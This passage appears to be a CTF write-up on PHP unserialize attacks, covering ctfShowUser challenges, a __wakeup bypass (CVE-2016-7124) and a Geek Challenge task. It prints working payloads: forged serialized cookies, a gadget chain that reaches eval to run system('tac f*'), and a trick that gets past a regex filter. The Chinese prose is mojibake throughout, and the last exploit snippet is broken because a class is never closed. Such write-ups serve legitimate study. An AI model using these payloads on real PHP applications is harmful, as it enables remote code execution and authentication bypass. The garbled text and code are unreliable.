class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadï¼š</p><blockquote><p>GET:username=xxxxxx&amp;password=xxxxxx Cookie:user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username!==<span class="hljs-keyword">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>GET ä¼ å…¥çš„<code>usernameå’Œpassword</code>è¿›å…¥<code>login</code>ï¼Œåˆ¤æ–­ååºåˆ—åŒ–å¯¹è±¡<code>user</code>åä¼ å…¥çš„<code>usernameå’Œpassword</code>æ˜¯å¦ç­‰äº<code>login</code>ä¼ å…¥çš„(å³ GET ä¼ å…¥çš„ï¼‰ä¸¤ä¸ªå€¼ï¼Œè€Œ<code>vipOneKeyGetFlag</code>è¦æ±‚ä¸¤ä¸ªå€¼ä¸ç›¸ç­‰</p><p>payloadï¼š</p><blockquote><p>GET:username=a&amp;password=b Cookie:O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å®šä½åˆ° evalï¼Œæ˜¾ç„¶éœ€è¦ cat æŸ¥çœ‹ flag</p><blockquote><p>$code=â€system(â€˜tac f*â€˜)â€</p></blockquote><p>é‚£ä¹ˆå°±è¦ä½¿ç”¨<code>getInfo</code>æ–¹æ³•ï¼Œä»è€Œéœ€è¦å®ä¾‹åŒ–ç±»<code>backDoor</code>è€Œä¸æ˜¯ç±»<code>Info</code>ï¼Œæ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> backDoor();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//åºåˆ—åŒ–$aï¼šO:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:14:&quot;backDoorcode&quot;;s:17:&quot;system(&#x27;tac f*&#x27;);&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæå‡ºä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ä¸Šé¢çš„ PHP åºåˆ—åŒ–çš„æ ¼å¼ä¸­æåˆ°ï¼š<strong>public/protected/private åœ¨åºåˆ—åŒ–æ—¶</strong>ï¼Œåºåˆ—åŒ–ä¸ä¼šä¿å­˜æ–¹æ³•ï¼Œé‚£ä¸Šé¢çš„è¿™è¡Œä»£ç èµ·ä»€ä¹ˆä½œç”¨</p><blockquote><p>$this-&gt;class=new backDoor();</p></blockquote><p>å…¶å®è¿™é‡Œä¼šæŠŠå®ä¾‹åŒ–çš„<code>backDoor</code>å¯¹è±¡ä¿¡æ¯æ”¾åˆ°<code>ctfShowUser</code>ç±»é‡Œå†å®ä¾‹åŒ–ä¸º<code>ctfShowUser</code>çš„å¯¹è±¡<code>a</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹æ¯”ä¸Šé¢˜å¢åŠ äº†æ­£åˆ™åŒ¹é…ï¼Œ<code>/[oc]:\d+:/i</code>åŒ¹é…åœ¨å¼•å·å‰çš„å­—æ¯<code>o</code>æˆ–<code>c</code>ï¼Œè¿˜æœ‰å¼•å·åçš„æ•°å­—ï¼Œå†ä¸€ä¸ªå¼•å·</p><p>å³åŒ¹é…æ ¼å¼<code>x : num :</code></p><p>ååºåˆ—åŒ–åé¦–å­—æ¯è‚¯å®šæ˜¯<code>o</code>ï¼Œé‚£ä¹ˆå°±åœ¨æ•°å­—å‰åŠ ä¸€ä¸ª<code>+</code></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç©ºæ ¼åœ¨ php çš„ urlencode ä¼šç¼–ç ä¸º<code>+</code>ï¼Œå¦‚æœæ­¤æ—¶åœ¨æ•°å­—å‰å†åŠ å…¥<code>+</code>ï¼Œåˆ™ä¼šæŠŠ payload ä¸­çš„<code>+</code>ç¼–ç ä¸º<code>%2B</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211009121949046.png"></p><p>å»ºè®®åšæ³•æ˜¯ï¼Œå…ˆé€šè¿‡ php çš„ urlencodeï¼Œç„¶åæ‰‹åŠ¨æ’å…¥<code>%2B</code></p><p>å½“ç„¶ä¹Ÿå¯ä»¥ä¸åŠ  urlencodeï¼Œç„¶åæ·»åŠ <code>+</code>ï¼Œç„¶åæ•´ä½“ç¼–ç ï¼Œä½†æ˜¯å«æœ‰ private æ—¶å¤åˆ¶ä¸äº†ä¸å¯è§çš„å­—ç¬¦ï¼Œæ•…æ­¤åšæ³•åªé€‚åˆä¸å­˜åœ¨ private å±æ€§</p><h3 id="SoFun"><a href="#SoFun" class="headerlink" title="SoFun"></a>SoFun</h3><h3 id="CVE-2016-7124-wakeup-çš„ç»•è¿‡ï¼‰"><a href="#CVE-2016-7124-wakeup-çš„ç»•è¿‡ï¼‰" class="headerlink" title="CVE-2016-7124(__wakeup çš„ç»•è¿‡ï¼‰"></a>CVE-2016-7124(__wakeup çš„ç»•è¿‡ï¼‰</h3><p><strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeup()çš„æ‰§è¡Œã€‚</strong></p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>åˆ©ç”¨å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;key))&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;key == <span class="hljs-string">&#x27;flag&#x27;</span>)<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-string">&#x27;you failed 23333&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;key;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>]))&#123;<br>        show_source(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$answer</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$answer</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$answer</span>);<span class="hljs-comment">//</span><br>    &#125;<br><br><span class="hljs-comment">//__destructå·²ç»èµ‹å€¼$key=flag è€Œ__wakeupåˆæŠŠå˜é‡ç»™è¦†ç›–</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:1:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125; ç»•è¿‡__wakeup</span><br></code></pre></td></tr></table></figure><h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜ 2019 PHP"></a>æå®¢å¤§æŒ‘æˆ˜ 2019 PHP</h4><p><a href="http://www.zip/">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Name();<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//æ‰‹åŠ¨ä¿®æ”¹ç‰¹æ®Šå­—ç¬¦ä»¥åŠç»•è¿‡__Wakeup()</span><br><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br><br><br><span class="hljs-comment">//æœ‰æ—¶æ˜¯urlçš„getä¼ å‚ é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨urlç¼–ç  çœå»ä¿®æ”¹ç‰¹æ®Šå­—ç¬¦çš„æ“ä½œ</span><br><span class="hljs-comment">//$a = str_replace(2,3,$a);</span><br><span 